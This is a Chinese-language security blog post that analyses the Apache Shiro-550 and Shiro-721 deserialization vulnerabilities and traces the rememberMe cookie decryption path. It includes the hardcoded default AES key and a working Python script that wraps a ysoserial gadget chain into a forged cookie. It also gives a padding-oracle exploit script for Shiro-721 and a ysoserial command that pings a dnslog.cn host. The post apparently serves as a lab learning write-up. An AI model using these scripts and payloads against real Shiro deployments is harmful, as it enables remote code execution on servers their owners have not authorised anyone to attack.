---
title: Shiro反序列化漏洞
date: 2023-04-11 13:03:59
tags: Java
cover: https://raw.githubusercontent.com/todis21/image/main/202304161714754.png
---

# 概述

`Apache Shiro`是一个强大易用的Java安全框架，提供了认证、授权、加密和会话管理等功能。Shiro框架直观、易用，同时也能提供健壮的安全性。

Shiro反序列化漏洞Shiro-550`(Apache  Shiro < 1.2.5)`**和Shiro-721**`( Apache  Shiro < 1.4.2 )`**。这两个漏洞主要区别在于Shiro550使用已知密钥撞，后者Shiro721是使用**`登录后rememberMe={value}去爆破正确的key值`**进而反序列化，对比Shiro550条件只要有**`足够密钥库`**（条件比较低）、Shiro721需要登录（要求比较高**~~**鸡肋**~~）。

- `Apache Shiro < 1.4.2`**默认使用**`AES/CBC/PKCS5Padding`**模式**
- `Apache Shiro >= 1.4.2`**默认使用**`AES/GCM/PKCS5Padding`**模式**

# Shiro550

## 原理

Apache Shiro< =1.2.4提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞。
那么，Payload产生的过程：
命令=>序列化=>AES加密=>base64编码=>伪造RememberMe Cookie值

## 环境搭建

我是按照这个搭建的

https://blog.csdn.net/qq_44769520/article/details/123476443

## 分析

这个漏洞点出在这里

```java
public T deserialize(byte[] serialized) throws SerializationException {
    if (serialized == null) {
        String msg = "argument cannot be null.";
        throw new IllegalArgumentException(msg);
    }
    ByteArrayInputStream bais = new ByteArrayInputStream(serialized);
    BufferedInputStream bis = new BufferedInputStream(bais);
    try {
        ObjectInputStream ois = new ClassResolvingObjectInputStream(bis);
        @SuppressWarnings({"unchecked"})
        T deserialized = (T) ois.readObject();
        ois.close();
        return deserialized;
    } catch (Exception e) {
        String msg = "Unable to deserialze argument byte array.";
        throw new SerializationException(msg, e);
    }
}
```

这个是实现反序列化的函数，重点在`T deserialized = (T) ois.readObject();` 

若能够控制输入的参数`serialized`，`URLDNS`这条链就可以实现，既检测出反序列化漏洞



Alt+F7查找用法`deserialize`,找到下面两个方法

```java
protected byte[] serialize(PrincipalCollection principals) {
    return getSerializer().serialize(principals);
}

/**
 * De-serializes the given byte array by using the {@link #getSerializer() serializer}'s
 * {@link Serializer#deserialize deserialize} method.
 *
 * @param serializedIdentity the previously serialized {@code PrincipalCollection} as a byte array
 * @return the de-serialized (reconstituted) {@code PrincipalCollection}
 */
protected PrincipalCollection deserialize(byte[] serializedIdentity) {
    return getSerializer().deserialize(serializedIdentity);
}
```

这两个方法一个是进行序列化的，一个是进行反序列化的

毕竟是逆向分析，选择`deserialize`往前跟进,在`AbstractRememberMeManager.java`找到以下方法

```java
protected PrincipalCollection convertBytesToPrincipals(byte[] bytes, SubjectContext subjectContext) {
    if (getCipherService() != null) {
        bytes = decrypt(bytes);
    }
    return deserialize(bytes);
}
```

可以看到就进行了两个操作 `decrypt` 和 `deserialize`，一个是解密，一个是反序列化

查看`decrypt`

```java
protected byte[] decrypt(byte[] encrypted) {
    byte[] serialized = encrypted;
    CipherService cipherService = getCipherService();
    if (cipherService != null) {
        ByteSource byteSource = cipherService.decrypt(encrypted, getDecryptionCipherKey());
        serialized = byteSource.getBytes();
    }
    return serialized;
}
```

这里的解密是AES解密，需要一个KEY

一步步跟踪，找到了这个版本的key`kPH+bIxk5D2deZiIxcaaaA==`

```java
private static final byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode("kPH+bIxk5D2deZiIxcaaaA==");
```

下一步跟踪到这

```java
protected byte[] getRememberedSerializedIdentity(SubjectContext subjectContext) {

    if (!WebUtils.isHttp(subjectContext)) {
        if (log.isDebugEnabled()) {
            String msg = "SubjectContext argument is not an HTTP-aware instance.  This is required to obtain a " +
                    "servlet request and response in order to retrieve the rememberMe cookie. Returning " +
                    "immediately and ignoring rememberMe operation.";
            log.debug(msg);
        }
        return null;
    }

    WebSubjectContext wsc = (WebSubjectContext) subjectContext;
    if (isIdentityRemoved(wsc)) {
        return null;
    }

    HttpServletRequest request = WebUtils.getHttpRequest(wsc);
    HttpServletResponse response = WebUtils.getHttpResponse(wsc);

    String base64 = getCookie().readValue(request, response);
    // Browsers do not always remove cookies immediately (SHIRO-183)
    // ignore cookies that are scheduled for removal
    if (Cookie.DELETED_COOKIE_VALUE.equals(base64)) return null;

    if (base64 != null) {
        base64 = ensurePadding(base64);
        if (log.isTraceEnabled()) {
            log.trace("Acquired Base64 encoded identity [" + base64 + "]");
        }
        byte[] decoded = Base64.decode(base64);
        if (log.isTraceEnabled()) {
            log.trace("Base64 decoded byte array length: " + (decoded != null ? decoded.length : 0) + " bytes.");
        }
        return decoded;
    } else {
        //no cookie set - new site visitor?
        return null;
    }
}
```

这里的逻辑是先获取cookie中rememberMe的值，然后判断是否是deleteMe，不是则判断是否是符合base64的编码长度，然后再对其进行base64解码，将解码结果返回。

整个解密过程就结束了，虽然是往前跟踪，但是还是可以清楚的知道解密过程都是围绕Cookie中的`rememberMe`进行的，如果我们能构造`rememberMe`,就能执行命令了



查看依赖

![image-20230411222937180](https://raw.githubusercontent.com/todis21/image/main/202304161707095.png)

如果要执行命令，这里有两条链可以用，`CommonsCollections11`和`CommonsBeanutils1_183`

使用https://github.com/KpLi0rn/ysoserial这个工具即可获得poc，该工具比原版的ysoserial多了CommonsBeanutils1_183这条链



到这还不行，还要对poc进行加密，按照刚刚分析的，先对poc进行AES加密，然后再进行Base64加密

python exp

```python
import sys
import base64
import uuid
from random import Random
import subprocess
from Crypto.Cipher import AES

def encode_rememberme(command):
    popen = subprocess.Popen(['D:\\Java\\jdk1.8.0_111\\bin\\java.exe', '-jar', 'ysoserial-0.0.6-SNAPSHOT-all.jar', 'CommonsCollections11', command], stdout=subprocess.PIPE)
    BS   = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key  =  "kPH+bIxk5D2deZiIxcaaaA=="
    mode =  AES.MODE_CBC
    iv   =  uuid.uuid4().bytes
    encryptor = AES.new(base64.b64decode(key), mode, iv)
    file_body = pad(popen.stdout.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext

if __name__ == '__main__':
    payload = encode_rememberme(sys.argv[1])
    print("rememberMe={}".format(payload.decode()))
```

运行

```
python exp.py "calc"
```

运行结果

```
rememberMe=XGUr6gD4ROGr3hXfCCR+552ZDOGUz7RNy3NVrFL60gCD+M6CJY8sKWQr2FjC6JBR9cV9vCg0aE5srsMIp1X45r9NZf6AL/t1m+ldqR3AvgmHBYRS3jb6NqFGhLdU/kkYx7yrrdUlJ6Fsu1qlePITCG3+hIa4qMPw3vDxPmlUpgtiLaXU5ETc/9rXez7Uy0AbPa3qypDp2INyd5ilrGs5IaYf6AnsvIrDuL4xWwh54d48yerJ1OTXTRAF+NI9HXOrF5Ab17tCLuL3dlftB84Mf2SdH4mXZnp/ERZd3IfQ1H4OlWIWnf3r0MVjb3x091c8K03pmZILcIRwqVW0PeSYspnaKq+exsXI8YjH2i3LOpphYzUc9kLeLHleUsDvkiKicn4tR7HIFrPq7Ddqn7BFgnWE6OThLj90kGT19ZbzNz2b/a79n0WzFgNl35LgStJhxVq3pRltV91cQOhBA79ByJ+jdsnxmKnNwKDosCpUnwDpW02nzug6dHAuTpEGhJfrnZopx0uyJr51MNvvMlin9Bpm5zwfyfIZjiPZT/AHoum925fk+gQ4/UNGqb4gUkxj+8ak/BkEAJn3+xMurrFTb9lG2Y/7Sj6QlW6r+3DxuLucq5f0ncxpHH2k/HVj6M9fPbOT+38UPWm3tIGjZE1Up8tCuKVO8usqddt4kXLx4EvH+AOyZYlt1b6z431i2V2p+eoxtM1QmaGJ4liYNkliH8ViYwG8We1REgZ/s1oRghI+w/fb4eK87NhRhVG7Y0wVkPTkoN6GyLIlqNImd5SXJunG0HkcVuQDy0O2RO7SXRnJQq9lVVv4aY9uwIZJ8hpFLHphLbqBYIjmObfx9ddahRl5kcokN5RJbNXpmYOkYHsWSYLZNtOmyEkaQK+k3W6l71iD3gWoa5RXY8oRk6CJsda0VGAsJkaOdAmqOn7saQyx8b+LDCb96ZUS4BYitW6W6X1NSVyQ1utEIOttWjkTPaIzqR1+7VMepJCaPdUltLFRIPiBrfnJgNmHSww+pRB9yv7cqiMgrMAdTBRc4V5oq4wKCRQfiq99yh3zjXz2nOaomgV/ZUOhqHenJVb6U9wlonA+L0qb0Ge3kluoa7chNuMi3Mb41ZG2Tujskf7mdInayQdfzM/XeP3vcJZgX+n2jPkYJ2aNB93JooA3wDwtTqLzNVShB1lSFJqLw1x70zNkeVpRSrjRdwKi6fK3mcORAu8fnB6QBQtgLSmB3zxw8sT4Co2m0piGGt06HHJm/c4cgFT+yR7pf6fHEm3W3wz6/kQpZNwRTa6GD5H77rUCliHfm8P0bwmA07W/RkxD9/pMHjICd6gb5oPopDZktfxOa2acYH/bUNAva+lu09vV7VT+UhxSzHCEeqnco+HuFKygH58yG51mF+C5NteaEbNA61CPjjk6SmxFJz2wgCrYiOrl0ID+gYMn27YKxR8RYeWZAHtlYEVITm86O9dm5M0rfzJSD5M4FSeRr+KaVOWUcQM+C+rSiuDrxDRRIixgEG3fd25kk6jkHSBEwZQHZgVH5h/UR2QFWfrzg/pCQMHMwdiAEN3pQ2sXNnWkadvLFqg18q+HnXyjY8MPEtuG2mSIfjJBuN6n+clxrY/A2u7hWKncVbu+LYq3PKg7o/3Oe9i36erIZAVSgyekqb/Fn8E0TFveVPca2iyl/LGPWTycZH1bf8wYFtvlf09Nl6mR2Zpi102v8owawG75PHB/3odICxFX43IN3nnU+QsDt7tdk9BxMws3BE9EpZyG0hvWTH6w0mpLXRGulH4Lz8t49egtL1IvGAYXYwPZPy2aN5/vFm7hdTsstCou3UbhMRVrLgSMV/zhpZroiKQfUmTK756m8+aI/Kne+uFIMcypiZk1nCx4cdFF7p7PpH1+98ZGLIl5w1PMpnBWZ1eoQm/rlRzX9xHQtxZD1SHVipsfGOp7jDgYrRLgkIA41xmHcOXAoVPburAXraRNkNxe6bmMmhORolFuGUiyhX+pwxAbv+2Jaz0s4SDWPng59ADJd0aMIrP4SFqhPhpATl5M1DTBzlRQTrClQ1QNK2pOuIzsLzcIsR+qz+8RpDjK2kPIGAFvsUGWTB+DLCt9DLOa0GRgFVC9XGy5371JRrTCHhWAaQPhcN8UCyhSdAKrwxDSHXhaenk+QPKsnHQvC+QfG5k3mEGkl+Oeb9yoLrYHZa9apPc1A0Hf01YFdGHuTQDB8DsdaKpp6kbPpI1vm/SH9AohYRO9vmQ0MKuViNbuUvdlI0IJSR9u/G+wV9ODx4B9NqSmvE1eIntZt6NdjijR3jf+Jg1ZOsRZeVuyAeNso7alFaDUwe3FhmbU56mM0d3jQ1i2nQSdrOJ8dHAchiD3UQKgIyxpaazVqrbFmfQ/+ndpDQej5gB9j5TcV9i07W7Da7Id1ZDkzTJyS+s1tLmJesKU+mdE9PHbuTqLm9j0j07sLmTU/xGmP2fGlEAZYTZiC46R9l+L9LPDg8wLBhvpt51/golQ5QNbJu1iNxeG2Dt2kVImEL1hiKb6OlfQ9QqqhZlT4NQQHdBkvZSxGEBUWx5+RalHxMT++BAEAu8GBbnSVxH+21fR+q5HPn0YzDlMNjhvog0foC3LLlgkhTLEfSkZ3/7+ZkRE+Yygl/xJs/qhPZ+AtYwdUr2u+DP6IiqsFmNIU2FXYVWjeuaP+I7e5GfcF7RqzVisf5cYtbgrJQjCpispNP0SV9rKhpD3d63rNcrecwXoXG7STUiZ9Ddiq/H91rs+ZIGW/ewkP83MNDz/h/SdDVkccIWY0u8olhaExMFuM+twY5Gyr41r5AXfkZ3ofwGGi0y8QYNzTpm42dTLMfiyq7Mit+HtIsRPOB15xGw2p+zwPno2LK8H66mzDci+81uUWUYR5e1jD7UsPfw/0eO+eHrE6CFHP9RCMJ5zWdKNSqLJ+PYAAK3R2iGd+2s735JcyqiBGOp9JEytC1NhY4+ggQKp1k0SlBlbkzM970RUU+raMcV9F34415zjtihspktOcAlRSuxRTji8aD4iK7C9VFmBIaN85flM8ZDRx3dT0BHdDVPqTdWce8oP2pNAC43IG0uXvhobBGL2OcrbjY+sjqYP8181S8t6ysqADIMi4RsEr6sdbMfdYIRaLoh7mzRfxSeJgACHc8jlu/ioANqbifaixZFxYwG7tLCSqgAObAc6QKz0abiWalknxbiSOkFbAg8RzidRojhxwK7TDKbB4eTdKKw45DSbL9p2LInq4+CwiP3kmj0IhruQcdyfUE29QdLtr3hdSOAKplWjdymTFaCOEYl+ipuHPjV0Ha3WZPPR361Ik8yelUJzzsrhQJ2hKrGyskJLG2uFotEtPstSfy5mRGkQ2IteXvec8JcJ0nxrQvAuq4BLBL/RrtCo1dVLia7cSu/XaquEYHxJZc53VnhHojCpBe8YugB/2QsqXDTZ2mJCvQTsY31KJhy+fwjs9Z3zZWq+/NAvKcNvVpwh+OqiNMvRdUJiFKPa2fEls1jnUtobyZ5Zex5N3lthC2BZyBvs6/9Ma7cnROwBHcAui9lbSkK7DY/Tm8/nHUNmvE+o/rbsmvRIHExJ1NzrNdDXFvsg4+FScpVhU3Py0ecg2WRFxnC2U5UjKwRzEmMyKDqY91Xo7wpE8s12Hse+K6nsXHgLI7+33hCoIC6Rg9ffkViXx6gqFrViQxyOgC2C4d1dflU01uzcf3zBEMMEWz67B6pQFtxvqU8mAgzW+WTzX7X5L9edHKDarzHxarSshWswd37ruPDF8VbTTeNoyx+HUAriQxXQ5jkfuWRsqixwnH9mDOhmTcbebY0zVc4kSpF9xmUDa2hNX8do8oiBZ0gT6Wlo17wSvuQDLLhXmlj4eLNI+nqP9aLP2mXPbiNhtw0LyNBdDISRYidbSMARETawOslOYolNDI5Xs41SJhEBLRz7ZooAWDWZrbgDmXqoJz/kiwnrJ+9YiWenrHyPq7pUQspW76Qsq82NZfkv5NxND2fVysTYdB+JV/cnwGznuf+VoaFdACr3FUZWSR1LOZKlGaUensXv5lOmlmvlzWmlvRuFeKCOHdx/LR8epWHuuEo4p2BTrMYGK8+M6C9YlhxXeelBRIvNd8zatIcczEO/Db6t5wPSqyIE+C1Mv8aLWB0=
```



将它添加到Cookie上，注意，要删除原来的`JSESSIONID=xxxx` ,如果存在，系统将不解析rememberMe进行身份认证，导致无法利用

![image-20230411223955129](https://raw.githubusercontent.com/todis21/image/main/202304161707940.png)



运行结果

![image-20230411224237689](https://raw.githubusercontent.com/todis21/image/main/202304161706555.png)



# Shiro721

## 原理

在Shiro721漏洞中，由于Apache Shiro cookie中通过 AES-128-CBC 模式加密的rememberMe字段存在问题，用户可通过Padding Oracle Attack来构造恶意的rememberMe字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行。

![img](https://raw.githubusercontent.com/todis21/image/main/202304161706845.png)

## 利用条件

知道已经登陆用户的合法cookie且目标服务器含有可利用的攻击链就可以进行漏洞利用。

## 影响版本

```
1.2.5,  
1.2.6,  
1.3.0,  
1.3.1,  
1.3.2,  
1.4.0-RC2,  
1.4.0,  
1.4.1
```

## 分析

在Shiro550中,加密Cookie的密钥是硬编码的

```java
public AbstractRememberMeManager() {
        this.serializer = new DefaultSerializer<PrincipalCollection>();
        this.cipherService = new AesCipherService();
        setCipherKey(DEFAULT_CIPHER_KEY_BYTES);
    }
```

在1.2.5的版本后密钥变成了动态的,通过`generateNewKey()`获取密钥

```java
public AbstractRememberMeManager() {
        this.serializer = new DefaultSerializer<PrincipalCollection>();
        AesCipherService cipherService = new AesCipherService();
        this.cipherService = cipherService;
        setCipherKey(cipherService.generateNewKey().getEncoded());
    }
```

跟进查看`generateNewKey`

```java
public Key generateNewKey(int keyBitSize) {
    KeyGenerator kg;
    try {
        kg = KeyGenerator.getInstance(getAlgorithmName());
    } catch (NoSuchAlgorithmException e) {
        String msg = "Unable to acquire " + getAlgorithmName() + " algorithm.  This is required to function.";
        throw new IllegalStateException(msg, e);
    }
    kg.init(keyBitSize);
    return kg.generateKey();
}
```

这里使用了`init()`对keyBitSize进行初始化,跟进查看

```java
public final void init(int keysize) {
    this.init(keysize, JCAUtil.getDefSecureRandom());
}
```

这里调用了双参数`init()`，并且获取了一个随机数发生器`SecureRandom`



下一步调用了`kg.generateKey()`

```java
public final SecretKey generateKey() {
    if (this.serviceIterator == null) {
        return this.spi.engineGenerateKey();
    } else {
        RuntimeException failure = null;
        KeyGeneratorSpi mySpi = this.spi;

        while(true) {
            try {
                return mySpi.engineGenerateKey();
            } catch (RuntimeException var4) {
                if (failure == null) {
                    failure = var4;
                }

                mySpi = this.nextSpi(mySpi, true);
                if (mySpi == null) {
                    throw failure;
                }
            }
        }
    }
}
```

于生成加密所需的密钥，该方法首先会检查是否存在可用的 Service Provider Interface (SPI) 实例，如果存在则调用该实例的 engineGenerateKey() 方法来生成密钥

跟到`engineGenerateKey()`

```java
protected SecretKey engineGenerateKey(){
    SecretKeySpec var1 = null;
    if(this.random == null){
        this.random = SunJCE.getRandom();
    }
    byte[] var2 = new byte[this.keySize];
    this.random.nextBytes(var2);
    var1 = new SecretKeySpec(var2,"AES");
    return var1;
}
```

这里使用了AES算法生成对称密钥

以上是生成密钥的过程



## Padding Oracle Attack

**PS:懵了**

参考https://goodapple.top/archives/217

Padding Oracle Attack加密数据整体过程：

1. 选择一个明文`P`，用来生成你想要的密文`C`；
2. 使用适当的Padding将字符串填充为块大小的倍数，然后将其拆分为从1到N的块；
3. 生成一个随机数据块（C[n]表示最后一个密文块）；
4. 对于每一个明文块，从最后一块开始：
   1. 创建一个包括两块的密文C’，其是通过一个空块（00000…）与最近生成的密文块C[n+1]（如果是第一轮则是随机块）组合成的；
   2. 这步容易理解，就是Padding Oracle的基本攻击原理：修改空块的最后一个字节直至Padding Oracle没有出现错误为止，然后继续将最后一个字节设置为2并修改最后第二个字节直至Padding Oracle没有出现错误为止，依次类推，继续计算出倒数第3、4…个直至最后一个数据为止；
   3. 在计算完整个块之后，将它与明文块P[n]进行XOR一起创建C[n]；
   4. 对后续的每个块重复上述过程（在新的密文块前添加一个空块，然后进行Padding Oracle爆破计算）；

简单地说，每一个密文块解密为一个未知值，然后与前一个密文块进行XOR。通过仔细选择前一个块，我们可以控制下一个块解密来得到什么。即使下一个块解密为一堆无用数据，但仍然能被XOR化为我们控制的值，因此可以设置为任何我们想要的值





Padding Oracle Attack攻击是一种类似于sql盲注的攻击,这就要求服务器端有能够被我们利用的布尔条件

在https://goodapple.top/archives/217 这篇文章中，模拟的环境如下：

- 当收到一个有效的密文（一个被正确填充并包含有效数据的密文）时，应用程序正常响应（200 OK）
- 当收到无效的密文时（解密时填充错误的密文），应用程序会抛出加密异常（500 内部服务器错误）
- 当收到一个有效密文（解密时正确填充的密文）但解密为无效值时，应用程序会显示自定义错误消息 (200 OK)

说明可以通过响应头来判断明文填充是否正确，进而爆破出中间值





## 布尔条件

回到Shiro中，解密函数`AbstractRememberMeManager.decrypt()`:

```java
protected byte[] decrypt(byte[] encrypted) {
    byte[] serialized = encrypted;
    CipherService cipherService = getCipherService();
    if (cipherService != null) {
        ByteSource byteSource = cipherService.decrypt(encrypted, getDecryptionCipherKey());
        serialized = byteSource.getBytes();
    }
    return serialized;
}
```

跟进`cipherService.decrypt()`，最后到`crypt()`中调用`doFinal()`方法

```java
private byte[] crypt(javax.crypto.Cipher cipher, byte[] bytes) throws CryptoException {
    try {
        return cipher.doFinal(bytes);
    } catch (Exception e) {
        String msg = "Unable to execute 'doFinal' with cipher instance [" + cipher + "].";
        throw new CryptoException(msg, e);
    }
}
```

这里的`doFinal()`方法对密文进行异常处理

```java
public final byte[] doFinal(byte[] input) throws IllegalBlockSizeException, BadPaddingException {
    this.checkCipherState();
    if (input == null) {
        throw new IllegalArgumentException("Null input buffer");
    } else {
        this.chooseFirstProvider();
        return this.spi.engineDoFinal(input, 0, input.length);
    }
}
```

`doFinal()`方法有`IllegalBlockSizeException`和`BadPaddingException`这两个异常，分别用于捕获块大小异常和填充错误异常。异常会被抛出到`crypt()`方法中，最终被`getRememberedPrincipals()`方法捕获，并执行`onRememberedPrincipalFailure()`方法。

```java
public PrincipalCollection getRememberedPrincipals(SubjectContext subjectContext) {
    PrincipalCollection principals = null;
    try {
        byte[] bytes = getRememberedSerializedIdentity(subjectContext);
        //SHIRO-138 - only call convertBytesToPrincipals if bytes exist:
        if (bytes != null && bytes.length > 0) {
            principals = convertBytesToPrincipals(bytes, subjectContext);
        }
    } catch (RuntimeException re) {
        principals = onRememberedPrincipalFailure(re, subjectContext);
    }

    return principals;
}
```

这里的onRememberedPrincipalFailure()`方法调用了`forgetIdentity()该方法会调用`removeFrom()`，在response头部添加字段`Set-Cookie: rememberMe=deleteMe`。

```java
protected PrincipalCollection onRememberedPrincipalFailure(RuntimeException e, SubjectContext context) {

    if (log.isWarnEnabled()) {
        String message = "There was a failure while trying to retrieve remembered principals.  This could be due to a " +
                "configuration problem or corrupted principals.  This could also be due to a recently " +
                "changed encryption key, if you are using a shiro.ini file, this property would be " +
                "'securityManager.rememberMeManager.cipherKey' see: http://shiro.apache.org/web.html#Web-RememberMeServices. " +
                "The remembered identity will be forgotten and not used for this request.";
        log.warn(message);
    }
    forgetIdentity(context);
    //propagate - security manager implementation will handle and warn appropriately
    throw e;
}
```

倘若Padding结果不正确的话，响应包就会返回 `Set-Cookie: rememberMe=deleteMe`





如果Padding结果正确呢？

CBC模式下的分组密码，如果某一组的密文被破坏，那么在其之后的分组都会受到影响。这时候我们的密文就无法正确的被反序列化了

在反序列化的过程中，如果反序列化的结果错误，则会抛出异常。最后异常仍会被`getRememberedPrincipals()`方法处理。

但是对于Java来说，反序列化是以Stream的方式按顺序进行的，向其后添加或更改一些字符串并不会影响正常反序列化。

```java
public T deserialize(byte[] serialized) throws SerializationException {
    if (serialized == null) {
        String msg = "argument cannot be null.";
        throw new IllegalArgumentException(msg);
    }
    ByteArrayInputStream bais = new ByteArrayInputStream(serialized);
    BufferedInputStream bis = new BufferedInputStream(bais);
    try {
        ObjectInputStream ois = new ClassResolvingObjectInputStream(bis);
        @SuppressWarnings({"unchecked"})
        T deserialized = (T) ois.readObject();
        ois.close();
        return deserialized;
    } catch (Exception e) {
        String msg = "Unable to deserialize argument byte array.";
        throw new SerializationException(msg, e);
    }
}
```



综上所述

- Padding正确，服务器正常响应
- Padding错误，服务器返回`Set-Cookie: rememberMe=deleteMe`



## 复现



这里使用的是Vulfocus的环境

首先先登陆

![image-20230416170055907](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20230416170055907.png)



获取COOkie

![image-20230416170218529](https://raw.githubusercontent.com/todis21/image/main/202304161706960.png)



先用`ysoserial`生成class

```bash
java -jar ysoserial.jar CommonsCollections1 "ping 4997u3.dnslog.cn" > payload.class
```

python exp：

```python
#https://github.com/3ndz/Shiro-721
# -*- coding: utf-8 -*-
from paddingoracle import BadPaddingException, PaddingOracle
from base64 import b64encode, b64decode
from urllib import quote, unquote
import requests
import socket
import time

class PadBuster(PaddingOracle):
    def __init__(self, **kwargs):
        super(PadBuster, self).__init__(**kwargs)
        self.session = requests.Session()
        self.wait = kwargs.get('wait', 2.0)

    def oracle(self, data, **kwargs):
        somecookie = b64encode(b64decode(unquote(sys.argv[2])) + data)
        self.session.cookies['rememberMe'] = somecookie
        if self.session.cookies.get('JSESSIONID'):
            del self.session.cookies['JSESSIONID']
        while 1:
            try:
                response = self.session.get(sys.argv[1],
                        stream=False, timeout=5, verify=False)
                break
            except (socket.error, requests.exceptions.RequestException):
                logging.exception('Retrying request in %.2f seconds...',
                                  self.wait)
                time.sleep(self.wait)
                continue

        self.history.append(response)
        if response.headers.get('Set-Cookie') is None or 'deleteMe' not in response.headers.get('Set-Cookie'):
            logging.debug('No padding exception raised on %r', somecookie)
            return
        raise BadPaddingException


if __name__ == '__main__':
    import logging
    import sys

    if not sys.argv[3:]:
        print 'Usage: %s <url> <somecookie value> <payload>' % (sys.argv[0], )
        sys.exit(1)

    logging.basicConfig(level=logging.DEBUG)
    encrypted_cookie = b64decode(unquote(sys.argv[2]))
    padbuster = PadBuster()
    payload = open(sys.argv[3], 'rb').read()
    enc = padbuster.encrypt(plaintext=payload, block_size=16)
    print('rememberMe cookies:')
    print(b64encode(enc))
```

使用方法:

```bash
python shiro_exp.py http://192.168.110.131:41906/account [rememberMeCookie] payload.class
```





也可以使用工具：

https://github.com/feihong-cs/ShiroExploit-Deprecated

PS：跑很久

![image-20230416170521336](https://raw.githubusercontent.com/todis21/image/main/202304161706812.png)
